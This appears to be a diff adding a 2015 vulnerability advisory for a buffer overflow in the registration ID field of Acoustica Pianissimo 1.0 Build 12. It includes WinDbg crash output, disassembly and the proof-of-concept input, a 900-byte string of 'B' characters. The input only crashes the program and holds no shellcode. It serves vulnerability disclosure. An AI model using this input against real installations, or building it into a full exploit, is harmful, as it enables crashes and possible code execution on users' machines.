@@ -1,0 +1,73 @@
+Acoustica Pianissimo 1.0 Build 12 (Registration ID) Buffer Overflow PoC
+
+
+Vendor: Acoustica, Inc.
+Product web page: http://www.acoustica.com
+Affected version: 1.0 Build 12
+
+Summary: Pianissimo virtual piano uses a combination of sample
+playback and advanced physical modeling to create a stunning
+acoustic grand piano sound. Starting with 250 MB of high quality
+samples of a Steinway™ Model D grand piano, Pianissimo uses
+complex signal processing and programming to recreate the warmth,
+response, and playability of a real grand piano.
+
+Desc: The vulnerability is caused due to a boundary error in the
+processing of a user input in the registration id field of the
+registration procedure, which can be exploited to cause a buffer
+overflow when a user inserts long array of string for the ID.
+Successful exploitation could allow execution of arbitrary code
+on the affected machine.
+
+-----------------------------------------------------------------
+
+(b98.1790): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\VST\Pianissimo\Pianissimo.dll - 
+eax=00000000 ebx=532d0245 ecx=bdeec3ea edx=00000049 esi=4a18d43c edi=06c07739
+eip=061fbda7 esp=00184a28 ebp=4d2d0276 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+Pianissimo!CRefObj::SeekToData+0x4127:
+061fbda7 8b86dc200000    mov     eax,dword ptr [esi+20DCh] ds:002b:4a18f518=????????
+0:000> d esp-1000
+00183a28  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a38  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a48  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a58  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a68  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a78  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a88  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+00183a98  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+0:000> u 061fbda7
+Pianissimo!CRefObj::SeekToData+0x4127:
+061fbda7 8b86dc200000    mov     eax,dword ptr [esi+20DCh]
+061fbdad 50              push    eax
+061fbdae 6a30            push    30h
+061fbdb0 681cc52c06      push    offset Pianissimo!CRefObj::Tell+0x45bfc (062cc51c)
+061fbdb5 6810c52c06      push    offset Pianissimo!CRefObj::Tell+0x45bf0 (062cc510)
+061fbdba e841f8ffff      call    Pianissimo!CRefObj::SeekToData+0x3980 (061fb600)
+061fbdbf 83c410          add     esp,10h
+061fbdc2 8ac3            mov     al,bl
+
+-----------------------------------------------------------------
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit
+           Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5243
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5243.php
+
+
+16.03.2015
+
+--
+
+900 bytes:
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+11111-11111-11111-11111
